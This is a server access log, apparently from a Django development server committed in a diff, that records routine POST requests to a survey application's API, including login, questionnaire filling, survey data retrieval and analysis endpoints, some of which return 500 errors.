+[09/Jun/2024 09:48:56] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 2638
+[09/Jun/2024 09:48:57] "POST /api/qs/Submit/get_history HTTP/1.1" 200 971
+[09/Jun/2024 09:49:00] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:49:01] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 987
+[09/Jun/2024 09:49:01] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 259
+[09/Jun/2024 09:49:01] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 325
+[09/Jun/2024 09:49:03] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:49:04] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2121
+[09/Jun/2024 09:49:13] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:49:20] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:49:27] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2121
+[09/Jun/2024 09:49:28] "POST /api/qs/user/login HTTP/1.1" 200 110
+[09/Jun/2024 09:49:30] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 793
+[09/Jun/2024 09:52:21] "POST /api/qs/Submit/get_history HTTP/1.1" 200 971
+[09/Jun/2024 09:52:22] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 475
+[09/Jun/2024 09:52:23] "POST /api/qs/Submit/get_history HTTP/1.1" 200 971
+[09/Jun/2024 09:52:24] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 475
+[09/Jun/2024 09:52:29] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:53:20] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:53:20] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:53:49] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:03] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:03] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:11] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:12] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:55:13] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:17] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:55:21] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:23] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:55:25] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:26] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:55:27] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:28] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 460
+[09/Jun/2024 09:55:28] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 09:55:29] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 117
+[09/Jun/2024 09:55:30] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:31] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:55:32] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:33] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 09:55:35] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:55:36] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 09:55:38] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 09:55:41] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:55:41] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:55:42] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:56:09] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:14] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:56:20] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:21] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 987
+[09/Jun/2024 09:56:21] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 259
+[09/Jun/2024 09:56:21] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 325
+[09/Jun/2024 09:56:23] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:24] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:56:27] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:28] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:56:30] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:35] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1237
+[09/Jun/2024 09:56:35] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 424
+[09/Jun/2024 09:56:35] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 580
+[09/Jun/2024 09:56:36] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:37] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:56:38] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:56:41] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 09:56:41] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 09:56:41] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 129
+[09/Jun/2024 09:58:05] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:58:08] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:58:17] "POST /api/qs/user/login HTTP/1.1" 200 170
+[09/Jun/2024 09:59:24] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2790
+[09/Jun/2024 09:59:26] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 1058
+Building prefix dict from the default dictionary ...
+Loading model from cache /tmp/jieba.cache
+Loading model cost 0.781 seconds.
+Prefix dict has been built successfully.
+[09/Jun/2024 09:59:27] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 612
+[09/Jun/2024 09:59:27] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 744
+[09/Jun/2024 09:59:31] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2790
+[09/Jun/2024 09:59:45] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 09:59:47] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 09:59:57] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2803
+[09/Jun/2024 10:00:01] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 500 145
+[09/Jun/2024 10:00:03] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2803
+[09/Jun/2024 10:17:28] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 10:17:50] "POST /api/qs/user/login HTTP/1.1" 200 18
